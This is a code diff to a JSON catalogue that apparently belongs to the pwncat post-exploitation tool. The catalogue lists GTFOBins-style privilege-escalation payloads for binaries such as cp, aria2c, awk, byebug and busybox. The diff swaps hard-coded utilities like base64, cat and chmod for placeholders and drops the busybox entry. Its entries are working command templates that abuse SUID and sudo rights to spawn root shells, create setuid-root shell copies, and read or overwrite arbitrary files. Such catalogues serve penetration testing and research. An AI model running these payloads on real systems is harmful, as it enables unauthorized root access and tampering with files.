@@ -7,7 +7,7 @@
 		"name": "cp",
 		"write_file": {
 			"type": "base64",
-			"payload": "TF=/tmp/.pwncat; echo {data} | base64 -d > $TF; {path} $TF ${lfile}; unlink $TF"
+			"payload": "TF=/tmp/.pwncat; echo {data} | {base64} -d > $TF; {path} $TF ${lfile}; {unlink} $TF"
 		}
 	},
 	{
@@ -16,10 +16,10 @@
 			"script": "{command}", 
 			"suid": ["-p"]
 		},
-		"read_file": "{path} -p -c \"cat {lfile}\"",
+		"read_file": "{path} -p -c \"{cat} {lfile}\"",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+			"payload": "{path} -p -c \"echo -n {data} | {base64} -d > {lfile}\""
 		},
 		"command": "{path} -p -c {command}"
 	},
@@ -42,7 +42,7 @@
 	{
 		"name": "aria2c",
 		"shell": {
-			"script": "TF=$(mktemp); SHELL=$(mktemp); cp {shell} $SHELL; echo \"chown root:root $SHELL; chmod +sx $SHELL;\" > $TF;chmod +x $TF; {command}; sleep 1; $SHELL -p",
+			"script": "TF=$(mktemp); SHELL=$(mktemp); cp {shell} $SHELL; echo \"{chown} root:root $SHELL; {chmod} +sx $SHELL;\" > $TF;{chmod} +x $TF; {command}; sleep 1; $SHELL -p",
 			"need": ["--on-download-error=$TF","http://x"]
 		}
 	},
@@ -55,7 +55,7 @@
 		"read_file": "{path} -p -c \"cat {lfile}\"",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+			"payload": "{path} -p -c \"echo -n {data} | {base64} -d > {lfile}\""
 		},
 		"command": "{path} -p -c {command}"
 	},
@@ -78,7 +78,7 @@
 		"read_file": "{path} '//' {lfile}",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | base64 -d\" | getline) > 0){{ print >> LFILE }} }}'"
+			"payload": "{path} -v LFILE={lfile} 'BEGIN {{ printf \"\" > LFILE; while ((\"echo \\\"{data}\\\" | {base64} -d\" | getline) > 0){{ print >> LFILE }} }}'"
 		}
 	},
 	{
@@ -113,17 +113,6 @@
 		}
 	},
 	{
-		"name": "busybox",
-		"shell": {
-			"script": "{command} sh"
-		},
-		"read_file": "{path} -c \"cat {lfile}\"",
-		"write_file": {
-			"type": "base64",
-			"payload": "{path} -c \"echo -n {data} | base64 -d > {lfile}\""
-		}
-	},
-	{
 		"name": "byebug",
 		"shell": {
 			"script": "TF=$(mktemp);echo 'system(\"{shell}\")' > $TF;{command}  --no-stop -q $TF",
@@ -132,10 +121,10 @@
 				"-q"
 			]
 		},
-		"read_file": "TF=$(mktemp);echo 'system(\"cat {lfile}\")' > $TF;{command}  --no-stop -q $TF",
+		"read_file": "TF=$(mktemp);echo 'system(\"{cat} {lfile}\")' > $TF;{command}  --no-stop -q $TF",
 		"write_file": {
 			"type": "base64",
-			"payload": "TF=$(mktemp);echo 'system(\"echo {data} | base64 -d > {lfile}\")' > $TF;{path} --no-stop -q $TF"
+			"payload": "TF=$(mktemp);echo 'system(\"echo {data} | {base64} -d > {lfile}\")' > $TF;{path} --no-stop -q $TF"
 		}
 	},
 	{
@@ -144,10 +133,10 @@
 			"script": "{command}", 
 			"suid": ["-p"]
 		},
-		"read_file": "{path} -p -c \"cat {lfile}\"",
+		"read_file": "{path} -p -c \"{cat} {lfile}\"",
 		"write_file": {
 			"type": "base64",
-			"payload": "{path} -p -c \"echo -n {data} | base64 -d > {lfile}\""
+			"payload": "{path} -p -c \"echo -n {data} | {base64} -d > {lfile}\""
 		},
 		"command": "{path} -p -c {command}"
 	},
